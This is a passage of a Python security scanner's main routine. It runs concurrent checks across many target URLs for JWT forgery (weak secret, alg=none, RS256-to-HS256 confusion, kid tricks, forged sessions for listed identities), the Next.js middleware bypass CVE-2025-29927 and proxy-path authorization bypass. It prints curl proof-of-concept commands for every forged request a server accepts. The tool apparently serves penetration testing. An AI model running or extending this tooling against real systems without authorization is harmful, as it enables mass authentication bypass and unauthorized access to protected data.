            enabled.append("--check-proxy-bypass (manual map + auto set from COMMON_PROXY_PREFIXES)")
        elif args.paths:
            enabled.append(f"--check-proxy-bypass (auto: {len(COMMON_PROXY_PREFIXES)} public prefixes x {len(PROXY_BYPASS_PAYLOADS)} payloads per path from --paths)")
        else:
            print("[i] --full: auto proxy-resource bypass needs --paths (a list of protected paths like /users, /api/v1/users) - without it the bypass check is skipped", file=sys.stderr)
            args.check_proxy_bypass = False

        print(f"[*] --full: enabled checks: {', '.join(enabled)}")

    # --exclude: turn off named checks AFTER --full/individual flags are resolved
    if args.exclude:
        exclude_aliases = {
            "jwt": "jwt", "jwt-test": "jwt",
            "kid": "kid", "kid-test": "kid", "jwt-kid": "kid", "jwt-kid-test": "kid",
            "nextjs": "nextjs", "nextjs-cve": "nextjs", "cve": "nextjs", "cve-2025-29927": "nextjs",
            "proxy": "proxy", "proxy-bypass": "proxy",
        }
        excluded = set()
        for raw in args.exclude.split(","):
            name = raw.strip().lower()
            if not name:
                continue
            canon = exclude_aliases.get(name)
            if canon is None:
                print(f"[!] --exclude: unknown check '{raw.strip()}' (valid: jwt, kid, nextjs, proxy), ignored", file=sys.stderr)
                continue
            excluded.add(canon)
        if "jwt" in excluded:
            args.jwt_test = False
        if "kid" in excluded:
            args.jwt_kid_test = False
        if "nextjs" in excluded:
            args.check_nextjs_cve = False
        if "proxy" in excluded:
            args.check_proxy_bypass = False
        if excluded:
            print(f"[*] Excluded checks: {', '.join(sorted(excluded))}")

    if args.check_proxy_bypass and not args.proxy_bypass_map and not args.paths:
        print("[!] --check-proxy-bypass requires --proxy-bypass-map and/or --paths (for auto mode)", file=sys.stderr)
        sys.exit(1)

    headers = {}
    for h in args.header:
        if ":" not in h:
            print(f"[!] Invalid header, skipped: {h}", file=sys.stderr)
            continue
        key, value = h.split(":", 1)
        headers[key.strip()] = value.strip()

    jwt_payload = default_jwt_payload()
    if args.jwt_azure_b2c:
        jwt_payload = azure_b2c_jwt_payload()
    if args.jwt_payload:
        try:
            with open(args.jwt_payload, "r", encoding="utf-8") as f:
                jwt_payload = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"[!] Could not read --jwt-payload: {e}", file=sys.stderr)
            sys.exit(1)

    if args.jwt_claim:
        overrides = parse_claim_overrides(args.jwt_claim)
        jwt_payload = {**jwt_payload, **overrides}
        print(f"[*] Claims overridden via --jwt-claim: {list(overrides.keys())}")

    jwt_identities = None
    if args.jwt_identities:
        jwt_identities = read_identities(args.jwt_identities)
        print(f"[*] Identities loaded for session forgery: {len(jwt_identities)}")

    jwt_rsa_pubkey_pem = None
    if args.jwt_rsa_pubkey:
        try:
            jwt_rsa_pubkey_pem = load_rsa_public_key(args.jwt_rsa_pubkey, args.timeout)
            print(f"[*] Public RSA key loaded ({len(jwt_rsa_pubkey_pem)} bytes), enabling RS256->HS256 confusion check")
        except Exception as e:
            print(f"[!] Could not load --jwt-rsa-pubkey: {e}", file=sys.stderr)
            sys.exit(1)

    ignore_trivial_body = not args.allow_trivial_bodies
    extra_trivial_values = {v.strip().lower() for v in args.ignore_body_value} if args.ignore_body_value else None
    if not ignore_trivial_body:
        print("[*] Trivial health-check response filtering (OK/HEALTHY) is DISABLED (--allow-trivial-bodies)")

    if args.swagger:
        if args.paths:
            print("[i] --swagger: --paths is ignored in this mode (endpoints come from the spec)", file=sys.stderr)
        swagger_sources = read_swagger_sources(args.file)
        if not swagger_sources:
            print("[!] No Swagger UI URLs found in the input file.", file=sys.stderr)
            sys.exit(1)
        print(f"[*] Swagger sources loaded: {len(swagger_sources)}. Extracting endpoints (threads: {args.workers})...\n")
        raw_targets = build_swagger_target_urls(swagger_sources, args.timeout, not args.no_verify_ssl, headers, args.workers)
        if not raw_targets:
            print("[!] No endpoints extracted from the Swagger specs.", file=sys.stderr)
            sys.exit(1)
        raw_paths = None
        paths = None
        targets = raw_targets
        print(f"\n[*] {len(targets)} endpoint URLs to check. Starting check (threads: {args.workers})...\n")
    else:
        raw_targets = read_targets(args.file)
        if not raw_targets:
            print("[!] Targets list is empty.", file=sys.stderr)
            sys.exit(1)

        raw_paths = read_paths(args.paths) if args.paths else None
        paths = raw_paths
        targets = build_urls(raw_targets, paths)

        if paths:
            print(f"[*] Targets: {len(raw_targets)} x paths: {len(paths)} = {len(targets)} URLs. Starting check (threads: {args.workers})...\n")
        else:
            print(f"[*] Targets loaded: {len(targets)}. Starting check (threads: {args.workers})...\n")

    use_proxy_format = args.check_proxy_bypass  # fix the output format once for the whole run
    proxy_bypass_results = []  # list of (direct_url, template, baseline_ok, baseline_status, verdict, checks)

    results: list[CheckResult] = []
    if args.skip_baseline:
        print("[i] --skip-baseline: phase 1 (direct baseline/JWT/CVE check of targets/paths) skipped, "
              "going straight to proxy-bypass\n")
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
            future_to_url = {
                executor.submit(
                    check_target, url, args.timeout, args.method, not args.no_verify_ssl, headers,
                    args.jwt_test, args.jwt_secret, jwt_payload, args.jwt_header_name, args.jwt_cookie_name,
                    jwt_rsa_pubkey_pem, jwt_identities, ignore_trivial_body, extra_trivial_values,
                    args.check_nextjs_cve, jwt_profiles, args.jwt_kid_test,
                ): url
                for url in targets
            }
            completed = concurrent.futures.as_completed(future_to_url)
            if args.tqdm:
                completed = _tqdm(completed, total=len(future_to_url), desc="baseline/JWT/CVE/kid", unit="url")
            for future in completed:
                result = future.result()
                results.append(result)

                if args.output:
                    write_results_incremental(args.output, results, targets, use_proxy_format, proxy_bypass_results)

                if args.tqdm:
                    continue

                if args.fail_only and result.ok:
                    continue

                if result.ok:
                    print(f"[OK]   {result.url}  status={result.status_code} type={result.content_type} size={result.body_size}B")
                elif result.error:
                    print(f"[ERR]  {result.url}  request error: {result.error}")
                else:
                    print(f"[FAIL] {result.url}  status={result.status_code} type={result.content_type} size={result.body_size}B - {result.reason}")

                for jc in result.jwt_checks:
                    label = f"{jc.kind}/{jc.delivery}"
                    if jc.identity:
                        label = f"identity={jc.identity} {label}"
                    if jc.error:
                        print(f"       |- JWT[{label}] error: {jc.error}")
                    elif jc.accepted:
                        tag = "[CONTROL accepted]" if jc.is_control else "[!!! forged accepted]"
                        print(f"       |- {tag} JWT[{label}]: status={jc.status_code} type={jc.content_type} size={jc.body_size}B")
                        print(f"          PoC: {jc.curl_poc}")
                    else:
                        reason = " (health-check-like body, false positive filtered)" if jc.is_trivial_body else ""
                        print(f"       |- JWT[{label}] rejected: status={jc.status_code} type={jc.content_type} size={jc.body_size}B{reason}")

                if result.jwt_verdict:
                    verdict_labels = {
                        "confirmed_vulnerable": "[!!! CONFIRMED] server validates JWTs but accepts a forged one (weak secret / alg=none)",
                        "signature_not_validated": "[!] JWT signature is not checked at all (even random garbage accepted)",
                        "no_auth_required": "[i] endpoint returns 200 without a token - no auth required at all",
                        "protected": "[OK] all forged tokens rejected",
                    }
                    print(f"       |- VERDICT: {verdict_labels.get(result.jwt_verdict, result.jwt_verdict)}")

                for kc in result.kid_checks:
                    label = f"kid='{kc.kid_value}' alg={kc.alg}/{kc.delivery}"
                    if kc.error:
                        print(f"       |- KID[{label}] error: {kc.error}")
                    elif kc.accepted:
                        print(f"       |- [!!! full bypass] KID[{label}]: status={kc.status_code} type={kc.content_type} size={kc.body_size}B")
                        print(f"          PoC: {kc.curl_poc}")
                    elif kc.signature_stage_passed:
                        print(f"       |- [!! signature passed] KID[{label}]: status={kc.status_code} - response moved past the signature stage")
                        print(f"          response: {kc.body_snippet}")
                        print(f"          PoC: {kc.curl_poc}")
                    elif kc.differs_from_baseline:
                        print(f"       |- [? differs] KID[{label}]: status={kc.status_code} - response differs from forged-without-kid (manual review)")

                if result.kid_verdict:
                    kid_verdict_labels = {
                        "confirmed_full_bypass": "[!!! CONFIRMED] token with kid fully accepted (200 + data)",
                        "signature_check_skipped_with_kid": "[!!! CONFIRMED] presence of kid disables JWT signature validation (signature not checked)",
                        "differential_behavior_review": "[?] kid changes the server response - manual body review needed",
                        "protected": "[OK] kid changes nothing, forged tokens rejected",
                    }
                    print(f"       |- KID VERDICT: {kid_verdict_labels.get(result.kid_verdict, result.kid_verdict)}")

                for cc in result.nextjs_cve_checks:
                    if cc.error:
                        print(f"       |- CVE-2025-29927[{cc.payload}] error: {cc.error}")
                    elif cc.accepted:
                        print(f"       |- [!!! BYPASS] CVE-2025-29927 x-middleware-subrequest='{cc.payload}': status={cc.status_code} type={cc.content_type} size={cc.body_size}B")
                        print(f"          PoC: {cc.curl_poc}")
                    else:
                        trivial_note = " (health-check-like body)" if cc.is_trivial_body else ""
                        print(f"       |- CVE-2025-29927[{cc.payload}] rejected: status={cc.status_code}{trivial_note}")

                if result.nextjs_cve_verdict:
                    cve_verdict_labels = {
                        "confirmed_bypass": "[!!! CONFIRMED] x-middleware-subrequest bypasses Next.js middleware (CVE-2025-29927, CVSS 9.1)",
                        "protected": "[OK] bypass via x-middleware-subrequest did not work",
                        "not_applicable": "[i] endpoint is already reachable without the bypass - test uninformative",
                    }
                    print(f"       |- CVE-2025-29927 VERDICT: {cve_verdict_labels.get(result.nextjs_cve_verdict, result.nextjs_cve_verdict)}")

    ok_count = sum(1 for r in results if r.ok)
    fail_count = len(results) - ok_count
    print(f"\n[*] Total: {len(results)} | ok: {ok_count} | failed: {fail_count}")

    if args.jwt_test:
        confirmed = [r for r in results if r.jwt_verdict == "confirmed_vulnerable"]
        no_sig_check = [r for r in results if r.jwt_verdict == "signature_not_validated"]
        no_auth = [r for r in results if r.jwt_verdict == "no_auth_required"]
        protected = [r for r in results if r.jwt_verdict == "protected"]

        print(f"\n[*] JWT verdicts: confirmed vulnerable={len(confirmed)} | signature not checked={len(no_sig_check)} | no auth={len(no_auth)} | protected={len(protected)}")

        if confirmed:
            print(f"\n[!!!] CONFIRMED: server validates JWTs but accepts a forged one ({len(confirmed)}):")
            for r in confirmed:
                for jc in r.jwt_checks:
                    if jc.accepted and not jc.is_control:
                        identity_part = f"  identity={jc.identity}" if jc.identity else ""
                        print(f"      - {r.url}  [{jc.kind}/{jc.delivery}]{identity_part}")
                        print(f"        PoC: {jc.curl_poc}")

        if no_sig_check:
            print(f"\n[!] JWT signature is not checked at all (even a garbage token accepted) ({len(no_sig_check)}):")
            for r in no_sig_check:
                print(f"      - {r.url}")
                for jc in r.jwt_checks:
                    if jc.accepted and jc.is_control:
                        print(f"        PoC (garbage signature still accepted): {jc.curl_poc}")

        if no_auth:
            print(f"\n[i] Endpoints with no auth at all (200 without a token) ({len(no_auth)}):")
            for r in no_auth:
                print(f"      - {r.url}")
                print(f"        PoC (no token at all): curl -i '{r.url}'")

    if args.jwt_kid_test:
        kid_full = [r for r in results if r.kid_verdict == "confirmed_full_bypass"]
        kid_sig_skip = [r for r in results if r.kid_verdict == "signature_check_skipped_with_kid"]
        kid_review = [r for r in results if r.kid_verdict == "differential_behavior_review"]
        kid_protected = [r for r in results if r.kid_verdict == "protected"]

        print(f"\n[*] KID verdicts: full bypass={len(kid_full)} | signature not checked with kid={len(kid_sig_skip)} | needs manual review={len(kid_review)} | protected={len(kid_protected)}")

        if kid_full:
            print(f"\n[!!!] CONFIRMED FULL BYPASS via kid ({len(kid_full)}):")
            for r in kid_full:
                for kc in r.kid_checks:
                    if kc.accepted:
                        print(f"      - {r.url}  [kid='{kc.kid_value}' alg={kc.alg}/{kc.delivery}]")
                        print(f"        PoC: {kc.curl_poc}")

        if kid_sig_skip:
            print(f"\n[!!!] CONFIRMED: signature validation skipped when kid is present ({len(kid_sig_skip)}):")
            for r in kid_sig_skip:
                print(f"      - {r.url}")
                for kc in r.kid_checks:
                    if kc.signature_stage_passed and not kc.accepted:
                        print(f"        [kid='{kc.kid_value}' alg={kc.alg}/{kc.delivery}] response: {kc.body_snippet}")
                        print(f"        PoC: {kc.curl_poc}")
                        break

        if kid_review:
            print(f"\n[?] kid changes server behavior, manual review needed ({len(kid_review)}):")
            for r in kid_review:
                print(f"      - {r.url}")

    if args.check_nextjs_cve:
        cve_confirmed = [r for r in results if r.nextjs_cve_verdict == "confirmed_bypass"]
        cve_protected = [r for r in results if r.nextjs_cve_verdict == "protected"]
        cve_na = [r for r in results if r.nextjs_cve_verdict == "not_applicable"]

        print(f"\n[*] CVE-2025-29927 verdicts: confirmed bypass={len(cve_confirmed)} | protected={len(cve_protected)} | not applicable={len(cve_na)}")

        if cve_confirmed:
            print(f"\n[!!!] CONFIRMED CVE-2025-29927 (CVSS 9.1): Next.js middleware bypass via x-middleware-subrequest ({len(cve_confirmed)}):")
            for r in cve_confirmed:
                for cc in r.nextjs_cve_checks:
                    if cc.accepted:
                        print(f"      - {r.url}  [payload='{cc.payload}']")
                        print(f"        PoC: {cc.curl_poc}")

    if args.check_proxy_bypass:
        pairs = []
        if args.proxy_bypass_map:
            pairs.extend(read_proxy_bypass_map(args.proxy_bypass_map))
        if raw_paths:
            auto_pairs = build_auto_proxy_bypass_pairs(raw_targets, raw_paths)
            print(f"[*] Auto mode: generated {len(auto_pairs)} bypass pairs "
                  f"({len(raw_targets)} targets x {len(raw_paths)} paths x {len(COMMON_PROXY_PREFIXES)} public prefixes)")
            pairs.extend(auto_pairs)
        pairs = list(dict.fromkeys(pairs))  # drop exact duplicate (direct_url, template) pairs, keep order

        if not pairs:
            print("[!] No pairs to check for bypass: --proxy-bypass-map not given or empty, and --paths not given either.", file=sys.stderr)
        else:
            print(f"\n[*] Proxy-resource bypass check: {len(pairs)} pairs x {len(PROXY_BYPASS_PAYLOADS)} payloads...\n")
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
                future_to_pair = {
                    executor.submit(
                        check_proxy_bypass_pair, direct_url, template, args.timeout, not args.no_verify_ssl,
                        headers, ignore_trivial_body, extra_trivial_values,
                    ): (direct_url, template)
                    for direct_url, template in pairs
                }
                completed_pairs = concurrent.futures.as_completed(future_to_pair)
                if args.tqdm:
                    completed_pairs = _tqdm(completed_pairs, total=len(future_to_pair), desc="proxy-bypass", unit="pair")
                for future in completed_pairs:
                    direct_url, template = future_to_pair[future]
                    baseline_ok, baseline_status, verdict, checks = future.result()
                    proxy_bypass_results.append((direct_url, template, baseline_ok, baseline_status, verdict, checks))

                    if args.output:
                        write_results_incremental(args.output, results, targets, use_proxy_format, proxy_bypass_results)

                    if args.tqdm:
                        continue

                    print(f"[{'OPEN' if baseline_ok else 'closed'}] direct: {direct_url}  status={baseline_status}  via: {template}")
                    for c in checks:
                        if c.error:
                            print(f"       |- payload='{c.payload}' ({c.bypass_url}) error: {c.error}")
                        elif c.accepted:
                            print(f"       |- [!!! BYPASS] payload='{c.payload}': status={c.status_code} type={c.content_type} size={c.body_size}B  severity={c.severity}"
                                  + (f" ({', '.join(c.sensitive_indicators)})" if c.sensitive_indicators else ""))
                            print(f"          PoC: {c.curl_poc}")
                        else:
                            trivial_note = " (health-check-like body)" if c.is_trivial_body else ""
                            print(f"       |- payload='{c.payload}' ({c.bypass_url}) rejected: status={c.status_code}{trivial_note}")

                    verdict_labels = {
                        "confirmed_bypass": "[!!! CONFIRMED] direct access closed, but bypass through the proxy path returns data",
                        "protected": "[OK] direct access closed, all bypass variants rejected too",
                        "not_applicable": "[i] direct access is already open - bypass test uninformative",
                    }
                    verdict_line = f"       |- VERDICT: {verdict_labels.get(verdict, verdict)}"
                    if verdict == "confirmed_bypass":
                        pair_severity, _ = aggregate_pair_severity(checks)
                        verdict_line += f"  [SEVERITY: {pair_severity}]"
                    print(verdict_line)

            confirmed = [r for r in proxy_bypass_results if r[4] == "confirmed_bypass"]
            protected = [r for r in proxy_bypass_results if r[4] == "protected"]
            na = [r for r in proxy_bypass_results if r[4] == "not_applicable"]
            print(f"\n[*] Proxy-resource bypass verdicts: confirmed bypass={len(confirmed)} | protected={len(protected)} | not applicable={len(na)}")

            if confirmed:
                high_count = sum(1 for r in confirmed if aggregate_pair_severity(r[5])[0] == "HIGH")
                medium_count = sum(1 for r in confirmed if aggregate_pair_severity(r[5])[0] == "MEDIUM")
                low_count = sum(1 for r in confirmed if aggregate_pair_severity(r[5])[0] == "LOW")
                print(f"\n[!!!] CONFIRMED AUTHORIZATION BYPASS via proxy resource ({len(confirmed)}): "
                      f"HIGH={high_count} | MEDIUM={medium_count} | LOW={low_count}")
                for direct_url, template, _, _, _, checks in confirmed:
                    severity, indicators = aggregate_pair_severity(checks)
                    indicators_note = f"  ({', '.join(indicators)})" if indicators else ""
                    print(f"      - [{severity}] {direct_url}{indicators_note}")
                    for c in checks:
                        if c.accepted:
                            print(f"        payload='{c.payload}'  PoC: {c.curl_poc}")

    if args.output:
        # Findings were already written to the file as they became ready (after each
        # target and each bypass pair) via write_results_incremental - this is just a
        # final rewrite with the full set of findings, sorted by original order.
        write_results_incremental(args.output, results, targets, use_proxy_format, proxy_bypass_results)
        print(f"[*] Found bypasses/vulnerabilities saved to {args.output} (updated during the run; "
              f"protected/unsuccessful attempts are not written to the file, they are only in the console log above)")

    sys.exit(0 if fail_count == 0 else 2)


if __name__ == "__main__":
    main()
